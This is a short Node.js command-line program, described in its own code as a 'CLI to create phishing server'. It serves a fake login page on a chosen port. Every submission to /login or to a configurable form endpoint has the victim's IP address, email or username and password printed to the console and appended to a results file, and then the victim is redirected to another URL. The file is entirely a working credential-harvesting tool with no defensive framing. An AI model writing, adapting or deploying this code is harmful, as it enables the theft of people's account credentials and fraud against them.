#!/bin/env node
const { Command } = require("commander")
const express = require("express")
const fs = require("fs")
const program = new Command()
const webserver = express()
const path = require("path")

program
    .name("lft - webserver")
    .description("CLI to create phishing server")
    .version("1.2.0")

program.command("listen")
    .description("listen in a port")
    .argument("<port>", "port to listen")
    .option("-r, --redirect  <url>", "where will the victim be redirected by phishing?", "/")
    .option("-fa, --form-action  <url>", "url where the form sends the login request")
    .option("-f, --file <filename>", "phishing page to be served", "index.html")
    .action((port, options) => {
        webserver.use(express.urlencoded({ extended: false }))
        webserver.use(express.json())
        webserver.use("/", express.static("out"))
        webserver.get("/", (req, res) => {
            return res.sendFile(options.file, {
                "root":process.env.PWD
            })
        })

        if (options.formAction){
            webserver.post(options.formAction, async (req, res) => {
                const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress
                const email = req.body.email
                const passw = req.body.password
    
                console.log(`[fish] ${ip} ${email}:${passw}`)
                fs.appendFile("../results.txt", `Ip: ${ip} Email/Username: ${email} Password/Secret: ${passw}\n`, "utf-8", (err) => { })
    
                return res.redirect(options.redirect)
            })
        }
        
        webserver.post("/login", async (req, res) => {
            const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress
            const email = req.body.email
            const passw = req.body.password

            console.log(`[fish] ${ip} ${email}:${passw}`)
            fs.appendFile("../results.txt", `Ip: ${ip} Email/Username: ${email} Password/Secret: ${passw}\n`, "utf-8", (err) => { })

            return res.redirect(options.redirect)
        })

        webserver.listen(port, () => {
            console.log(`[info] server started at http://127.0.0.1:${port}`)
        })

    })

program.parse(process.argv)